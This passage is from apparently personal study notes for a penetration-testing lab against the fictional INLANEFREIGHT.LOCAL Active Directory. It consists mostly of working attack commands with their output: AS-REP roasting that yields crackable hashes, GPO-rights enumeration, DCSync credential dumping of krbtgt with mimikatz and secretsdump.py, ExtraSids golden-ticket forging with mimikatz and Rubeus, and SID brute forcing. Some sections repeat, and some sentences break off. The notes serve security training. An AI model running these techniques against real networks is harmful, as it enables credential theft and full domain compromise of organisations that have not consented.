</span></span><span style=display:flex><span>$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
</span></span><span style=display:flex><span>impacket-GetNPUsers cube.local/irfandc -no-pass -request -format hashcat -dc-ip 192.168.10.2
</span></span><span style=display:flex><span>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[-] User sbrown@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User jjones@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User tjohnson@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User jwilson@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User bdavis@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User njohnson@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User asanchez@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User dlewis@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User ccruz@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
</span></span><span style=display:flex><span>[-] User rramirez@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User jwallace@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span>[-] User jsantiago@inlanefreight.local doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p><a href=#R-image-a470d5ebc4c1ae9b606297c09845e651 class=lightbox-link><img alt=e282a1e838abceb1cdf5626c7cf95085.png class="lazy lightbox figure-image" loading=lazy src=../../resources/e282a1e838abceb1cdf5626c7cf95085.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-a470d5ebc4c1ae9b606297c09845e651><img alt=e282a1e838abceb1cdf5626c7cf95085.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/e282a1e838abceb1cdf5626c7cf95085.png></a></p><h2 id=group-policy-object-gpo-abuse>Group Policy Object (GPO) Abuse</h2><p>GPO misconfigurations can be abused to perform the following attacks:</p><ul><li>Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)</li><li>Adding a local admin user to one or more hosts</li><li>Creating an immediate scheduled task to perform any number of actions</li></ul><p>Â </p><h4 id=enumerating-gpo-names-with-powerview>Enumerating GPO Names with PowerView</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=enumerating-gpo-names-with-a-built-in-cmdlet>Enumerating GPO Names with a Built-In Cmdlet</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access</code></pre></div><p>Â </p><p>Â </p><h4 id=enumerating-domain-user-gpo-rights>Enumerating Domain User GPO Rights</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $sid=Convert-NameToSid &#34;Domain Users&#34;
PS C:\local&gt; Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Checking in BloodHound, we can see that the <code>Domain Users</code> group has several rights over the <code>Disconnect Idle RDP</code> GPO, which could be leveraged for full control of the object.</p><p>Â </p><p><a href=#R-image-ce6af44e7073c1c25a2a775e3534df62 class=lightbox-link><img alt=9a5fe66c13e9ab691a9e2a1169af45f0.png class="lazy lightbox figure-image" loading=lazy src=../../resources/9a5fe66c13e9ab691a9e2a1169af45f0.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ce6af44e7073c1c25a2a775e3534df62><img alt=9a5fe66c13e9ab691a9e2a1169af45f0.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/9a5fe66c13e9ab691a9e2a1169af45f0.png></a></p><p>Â </p><p>If we select the GPO in BloodHound and scroll down to <code>Affected Objects</code> on the <code>Node Info</code> tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p><p>Â </p><p>Â </p><p><a href=#R-image-ca37a6a90b45921a5707f52d6a555352 class=lightbox-link><img alt=c082cecd922fda4a5e258219e6dde7c3.png class="lazy lightbox figure-image" loading=lazy src=../../resources/c082cecd922fda4a5e258219e6dde7c3.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ca37a6a90b45921a5707f52d6a555352><img alt=c082cecd922fda4a5e258219e6dde7c3.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/c082cecd922fda4a5e258219e6dde7c3.png></a></p><p>Â </p><p>We could use a tool such as <a href=https://github.com/FSecureLABS/SharpGPOAbuse rel=external>SharpGPOAbuse</a> to take advantage of th</p><p>Â </p><p>Â </p><h1 id=domain-trusts-primer>Domain Trusts Primer</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainTrust 

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes</code></pre></div><p>Â </p><p>Â </p><h4 id=using-get-domaintrustmapping>Using Get-DomainTrustMapping</h4><p>Domain Trusts Primer</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : FREIGHTLOGISTICS.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:08 PM
WhenChanged     : 2/27/2022 12:02:41 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM</code></pre></div><p>Â </p><p>Â </p><h4 id=checking-users-in-the-child-domain-using-get-domainuser>Checking Users in the Child Domain using Get-DomainUser</h4><p>Domain Trusts Primer</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

samaccountname
--------------
local-student_adm
Administrator
Guest
lab_adm
krbtgt</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=using-netdom-to-query-domain-trust>Using netdom to query domain trust</h4><p>Domain Trusts Primer</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; netdom query /domain:inlanefreight.local trust
Direction Trusted\Trusting domain                         Trust type
========= =======================                         ==========

&lt;-&gt;       LOGISTICS.INLANEFREIGHT.LOCAL
Direct
 Not found

&lt;-&gt;       FREIGHTLOGISTICS.LOCAL
Direct
 Not found</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p><a href=#R-image-ec82c22653dbcc10d511529740ead883 class=lightbox-link><img alt=c4be2624309890bb28081f8b6e3c7f7c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/c4be2624309890bb28081f8b6e3c7f7c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ec82c22653dbcc10d511529740ead883><img alt=c4be2624309890bb28081f8b6e3c7f7c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/c4be2624309890bb28081f8b6e3c7f7c.png></a></p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h2 id=extrasids-attack---mimikatzgolden-ticketrs>ExtraSids Attack - Mimikatz(Golden ticketrs)</h2><p>Â </p><h4 id=obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz>Obtaining the KRBTGT Account&rsquo;s NT Hash using Mimikatz</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt;  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] &#39;LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the domain
[DC] &#39;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the DC server
[DC] &#39;LOGISTICS\krbtgt&#39; will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e</code></pre></div><p>Â </p><p>Â </p><h4 id=using-get-domainsid>Using Get-DomainSID</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainSID

S-1-5-21-2806153819-209893948-922872689</code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &#34;Enterprise Admins&#34; | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519</code></pre></div><p>Â </p><p>Â </p><h4 id=creating-a-golden-ticket-with-mimikatz>Creating a Golden Ticket with Mimikatz</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for &#39;hacker @ LOGISTICS.INLANEFREIGHT.LOCAL&#39; successfully submitted for current session</code></pre></div><p>Â </p><p>Â </p><h4 id=confirming-a-kerberos-ticket-is-in-memory-using-klist>Confirming a Kerberos Ticket is in Memory Using klist</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0&gt;     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called:</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=creating-a-golden-ticket-using-rubeus>Creating a Golden Ticket using Rubeus</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt;  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=performing-a-dcsync-attack>Performing a DCSync Attack</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\Tools\mimikatz\x64&gt; .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] &#39;INLANEFREIGHT.LOCAL&#39; will be the domain
[DC] &#39;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#39; will be the DC server
[DC] &#39;INLANEFREIGHT\lab_adm&#39; will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001</code></pre></div><p>Â </p><p>Â </p><p>When dealing with multiple domains and our target domain is not the same as the user&rsquo;s domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:</p><p>Attacking Domain Trusts - Child -> Parent Trusts - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] &#39;INLANEFREIGHT.LOCAL&#39; will be the domain
[DC] &#39;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#39; will be the DC server
[DC] &#39;INLANEFREIGHT\lab_adm&#39; will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b10</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=attacking-domain-trusts---child---parent-trusts---from-linux>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</h1><p>Â </p><h4 id=performing-dcsync-with-secretsdumppy>Performing DCSync with secretsdump.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ secretsdump.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span><span style=display:flex><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style=display:flex><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
</span></span><span style=display:flex><span>[*] Kerberos keys grabbed
</span></span><span style=display:flex><span>krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
</span></span><span style=display:flex><span>krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
</span></span><span style=display:flex><span>krbtgt:des-cbc-md5:fee04c3d026d7538
</span></span><span style=display:flex><span>[*] Cleaning up...
</span></span></code></pre></div><p>Next, we can use <a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py rel=external>lookupsid.py</a> from the Impacket toolkit to perform SID brute forcing to find the SID</p><p>Â </p><p>Â </p><h4 id=performing-sid-brute-forcing-using-lookupsidpy>Performing SID Brute Forcing using lookupsid.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ lookupsid.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Brute forcing SIDs at 172.16.5.240
</span></span><span style=display:flex><span>[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
</span></span><span style=display:flex><span>[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
</span></span><span style=display:flex><span>500: LOGISTICS\Administrator (SidTypeUser)
</span></span><span style=display:flex><span>501: LOGISTICS\Guest (SidTypeUser)
</span></span><span style=display:flex><span>502: LOGISTICS\krbtgt (SidTypeUser)
</span></span><span style=display:flex><span>512: LOGISTICS\Domain Admins (SidTypeGroup)
</span></span><span style=display:flex><span>513: LOGISTICS\Domain Users (SidTypeGroup)
</span></span></code></pre></div><p>Â </p><h1 id=attacking-domain-trusts---child---parent-trusts---from-linux-1>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</h1><p>Â </p><h4 id=performing-dcsync-with-secretsdumppy-1>Performing DCSync with secretsdump.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ secretsdump.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span><span style=display:flex><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style=display:flex><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
</span></span><span style=display:flex><span>[*] Kerberos keys grabbed
</span></span><span style=display:flex><span>krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
</span></span><span style=display:flex><span>krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
</span></span><span style=display:flex><span>krbtgt:des-cbc-md5:fee04c3d026d7538
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=performing-sid-brute-forcing-using-lookupsidpy-1>Performing SID Brute Forcing using lookupsid.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ lookupsid.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Brute forcing SIDs at 172.16.5.240
</span></span><span style=display:flex><span>[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
</span></span><span style=display:flex><span>[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
</span></span><span style=display:flex><span>500: LOGISTICS\Administrator (SidTypeUser)
